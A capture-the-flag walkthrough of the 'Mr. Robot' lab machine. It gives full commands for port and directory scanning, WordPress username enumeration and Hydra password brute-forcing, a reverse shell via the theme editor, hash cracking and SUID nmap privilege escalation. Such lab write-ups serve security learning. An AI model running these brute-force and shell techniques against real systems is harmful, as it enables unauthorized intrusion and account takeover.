# Mr. Robot CTF

## Objective

The goal of the room is to find **3 hidden keys** and obtain root access to the machine.

---

# 1. Reconnaissance

Started with an Nmap scan:

```bash
nmap <target-ip> -sV -T4 -oA nmap-scan -open
```

### Important Flags

- `-sV` — Attempts to determine the version of the service running on the port.
- `-T4` — Aggressive timing.
- `-oA` — Saves the output in the three major formats.
- `-open` — Shows only open or possibly open ports.

### Results

The scan identified:

```text
80/tcp   open   http
443/tcp  open   https
```

The web server became the primary attack surface.

---

# 2. Web Enumeration

Used Gobuster to enumerate directories:

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

### Interesting Results

Gobuster revealed:

```text
/wp-login
/robots
```

The `/wp-login` endpoint exposed a WordPress login page.

The `/robots` endpoint revealed:

```text
/fsocity.dic
/key-1-of-3.txt
```

The first key was obtained from:

```text
/key-1-of-3.txt
```

The `fsocity.dic` file appeared to contain usernames and passwords and was used as a wordlist.

---

# 3. WordPress Login Enumeration

The first step was to understand how WordPress responded to an invalid username.

A login attempt using:

```text
Admin
```

returned:

```text
ERROR: Invalid username.
```

This error message could be used to distinguish invalid usernames from valid usernames.

---

# 4. Burp Suite

Captured a failed WordPress login request using Burp Suite Proxy.

The POST request contained two important parameters:

```text
log
pwd
```

These parameters were required when constructing the Hydra attack.

---

# 5. Wordlist Preparation

The original `fsocity.dic` contained approximately:

```text
858160
```

words, many of which were duplicates.

The wordlist was reduced:

```bash
wc -w fsocity.dic

sort fsocity.dic | uniq -d > fs-list
sort fsocity.dic | uniq -u >> fs-list

wc -w fs-list
```

The resulting list contained approximately:

```text
11451
```

entries.

---

# 6. Username Enumeration with Hydra

Used Hydra to identify a valid WordPress username:

```bash
hydra -L fs-list -p test <target-ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
```

### Important Options

- `-L fs-list` — Username wordlist.
- `-p test` — Static password.
- `http-post-form` — Indicates a POST-based HTTP login form.
- `/wp-login.php` — WordPress login endpoint.
- `log=^USER^&pwd=^PASS^` — Login parameters discovered with Burp Suite.
- `F=Invalid username` — Failure condition.
- `-t 30` — Runs 30 parallel tasks.

The attack identified:

```text
elliot
```

as a valid username.

---

# 7. Password Attack

With a valid username identified, Hydra was used again to discover the password:

```bash
hydra -l elliot -P fs-list <target-ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
```

The important differences were:

- `-l elliot` — Uses a single known username.
- `-P fs-list` — Uses the wordlist as the password list.
- The failure condition was changed to match the new WordPress error message.

The recovered credentials allowed login to the WordPress dashboard.

---

# 8. WordPress Administrator Access

The `elliot` account appeared to have administrator privileges.

This provided access to:

```text
Appearance → Editor
```

The WordPress theme editor contained PHP templates.

A PHP reverse shell was placed inside one of the theme templates.

The IP address and port inside the reverse shell were changed to point back to the attacking machine.

---

# 9. Reverse Shell

Started a Netcat listener:

```bash
nc -lnvp 1234
```

After visiting the modified WordPress template, the PHP code executed and a reverse shell was received.

At this point, initial shell access to the target was established.

---

# 10. Finding the Second Key

After obtaining the shell, interesting files were discovered inside:

```text
/home/robot
```

Two important findings were:

- The second key.
- An MD5 hash belonging to the `robot` user.

The MD5 hash was cracked to recover the password for `robot`.

---

# 11. Switching to robot

An initial attempt to switch users indicated that an interactive terminal was required.

Python and the `pty` module were used to obtain an interactive shell.

After obtaining an interactive terminal, it was possible to switch to:

```text
robot
```

The second key could then be read.

---

# 12. Privilege Escalation

The final key required root access.

SUID files were enumerated:

```bash
find / -perm -u=s -type f 2>/dev/null
```

The output contained several expected SUID binaries.

One particularly interesting finding was:

```text
nmap
```

The `nmap` binary had the SUID bit set.

This provided a potential privilege escalation vector.

---

# 13. SUID nmap Exploitation

The SUID `nmap` binary was investigated using GTFOBins.

GTFOBins provided a technique for abusing `nmap` when it has elevated SUID privileges.

Using the SUID `nmap` binary, a root shell was obtained.

The privilege escalation chain was therefore:

```text
Low-privileged shell
        ↓
SUID enumeration
        ↓
SUID nmap
        ↓
GTFOBins
        ↓
Root
```

---

# 14. Finding the Third Key

After obtaining root access, the filesystem was searched for the final key.

The third and final key was located and read.

At this point all three keys had been obtained.

---

# Alternative Techniques

## Burp Suite Intruder

Instead of using Hydra for the password attack, the captured WordPress login request can be sent to Burp Suite Intruder.

The `pwd` parameter can be selected as the payload position and the `fs-list` wordlist loaded.

The Community Edition is rate-limited, so the attack can take considerably longer.

---

## WPScan

The password attack can alternatively be performed with WPScan:

```bash
wpscan --url http://<target-ip> -t 50 -U elliot -P fs-list
```

WPScan is designed specifically for testing WordPress installations.

---

# Hash Cracking Alternatives

## John the Ripper

The MD5 hash belonging to `robot` can be cracked with John the Ripper.

Example:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The hash format can also be specified when required.

---

## Hashcat

The same hash can be attacked using Hashcat:

```bash
hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
```

For Hashcat:

```text
-m 0
```

represents the MD5 hash mode.

---

# Tools Used

- Nmap
- Gobuster
- Burp Suite
- Hydra
- Netcat
- WPScan
- John the Ripper
- Hashcat
- GTFOBins
- Python
- pty

---

# Attack Chain

```text
Nmap
  ↓
Identify Web Services
  ↓
Gobuster
  ↓
/robots
  ↓
fsocity.dic
  ↓
Burp Suite
  ↓
Identify Login Parameters
  ↓
Hydra
  ↓
Valid Username
  ↓
Password Attack
  ↓
WordPress Administrator
  ↓
PHP Template Modification
  ↓
Reverse Shell
  ↓
robot Hash
  ↓
Hash Cracking
  ↓
robot
  ↓
SUID Enumeration
  ↓
SUID nmap
  ↓
GTFOBins
  ↓
Root
  ↓
Third Key
```

---

# Key Takeaways

- Nmap provides the initial view of the attack surface.
- Gobuster can reveal hidden directories and files.
- `robots.txt` may expose sensitive paths that should not be publicly accessible.
- Web application error messages can sometimes be useful for username enumeration.
- Burp Suite is useful for understanding the exact structure of authentication requests.
- Hydra can automate dictionary attacks against HTTP login forms.
- WordPress administrator access can provide a route to code execution.
- Reverse shells provide interactive access to compromised systems.
- Password hashes can be attacked offline using tools such as John the Ripper or Hashcat.
- SUID enumeration is an important Linux privilege escalation step.
- Unusual SUID binaries should always be investigated.
- GTFOBins is useful for researching known ways to abuse Unix binaries.
- Privilege escalation should follow a systematic process of enumeration, validation, exploitation, and verification.

---

# Final Methodology

```text
Reconnaissance
      ↓
Enumeration
      ↓
Identify Attack Surface
      ↓
Web Enumeration
      ↓
Credential Discovery
      ↓
Initial Access
      ↓
Reverse Shell
      ↓
Credential / Hash Analysis
      ↓
User Escalation
      ↓
SUID Enumeration
      ↓
Privilege Escalation
      ↓
Root
      ↓
Final Key
```